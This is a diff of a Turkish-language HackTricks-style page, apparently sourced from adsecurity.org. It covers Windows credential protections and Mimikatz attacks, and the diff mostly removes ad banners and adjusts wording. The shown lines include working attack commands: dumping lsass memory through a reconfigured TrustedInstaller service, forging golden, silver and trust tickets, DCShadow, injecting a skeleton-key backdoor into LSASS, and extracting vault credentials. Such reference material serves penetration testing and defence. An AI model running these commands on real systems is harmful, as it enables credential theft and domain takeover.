@@ -2,19 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınızda ilerleyerek iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 **Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) adresinden alınmıştır**. Daha fazla bilgi için orijinaline bakın!
 
-## Bellekte LM ve Düz Metin
+## LM ve Bellekte Düz Metin
 
 Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:
 
-- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmaması için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının `0` DWORD değeri ile yapılandırılması gerekmektedir.
+- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının DWORD değeri `0` olarak yapılandırılması gerekmektedir.
 
 - **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
 1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
@@ -22,9 +16,9 @@ Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığ
 
 Bu korumalara rağmen, Mimikatz gibi araçlar belirli sürücüleri kullanarak LSA Korumasını aşabilir, ancak bu tür eylemlerin olay günlüklerinde kaydedilmesi muhtemeldir.
 
-### SeDebugPrivilege Kaldırma ile Mücadele
+### SeDebugPrivilege Kaldırılmasına Karşı Önlem Alma
 
-Yönetici kullanıcılar genellikle programları hata ayıklama yeteneği veren SeDebugPrivilege'e sahiptir. Bu ayrıcalık, yetkisiz bellek dökümünü önlemek için kısıtlanabilir; bu, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak, bu ayrıcalık kaldırıldığında bile, TrustedInstaller hesabı özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümleri gerçekleştirebilir:
+Yönetici kullanıcılar genellikle programları hata ayıklamalarına olanak tanıyan SeDebugPrivilege'e sahiptir. Bu ayrıcalık, yetkisiz bellek dökümünü önlemek için kısıtlanabilir; bu, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak, bu ayrıcalık kaldırıldığında bile, TrustedInstaller hesabı özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümleri gerçekleştirebilir:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -76,10 +70,10 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 
 Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:
 
-- Komut: Golden Ticket'e benzer ancak belirli hizmetleri hedef alır.
+- Komut: Golden Ticket'a benzer ancak belirli hizmetleri hedef alır.
 - Parametreler:
-- `/service`: Hedef alınacak hizmet (örneğin, cifs, http).
-- Diğer parametreler Golden Ticket ile benzerdir.
+- `/service`: Hedef alınacak hizmet (örn., cifs, http).
+- Diğer parametreler Golden Ticket'a benzer. 
 
 Örnek:
 ```bash
@@ -87,7 +81,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Güven Bileti Oluşturma
 
-Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
+Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim için kullanılır. Ana komut ve parametreler:
 
 - Komut: Golden Ticket'e benzer ancak güven ilişkileri için.
 - Parametreler:
@@ -124,7 +118,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Active Directory Manipülasyonu
 
-- **DCShadow**: Bir makineyi AD nesne manipülasyonu için geçici olarak DC olarak çalıştırır.
+- **DCShadow**: Bir makineyi AD nesne manipülasyonu için geçici olarak DC gibi davranmasını sağlar.
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
@@ -158,7 +152,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Çeşitli
 
-- **MISC::Skeleton**: LSASS'a bir arka kapı enjekte eder.
+- **MISC::Skeleton**: DC üzerindeki LSASS'a bir arka kapı enjekte eder.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Yetki Yükseltme
@@ -184,7 +178,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
 
 - Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Değiştir: _Orijinal bağlamda değiştirme için özel bir komut yoktur._
+- Değiştir: _Orijinal bağlamda değiştir için özel bir komut yoktur._
 
 - **TOKEN::Elevate**: Token'ları taklit eder.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -203,10 +197,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Windows Vault'tan şifreleri çıkarır.
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademi ile derinleştirin. Kendi hızınızda kurslar aracılığıyla iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
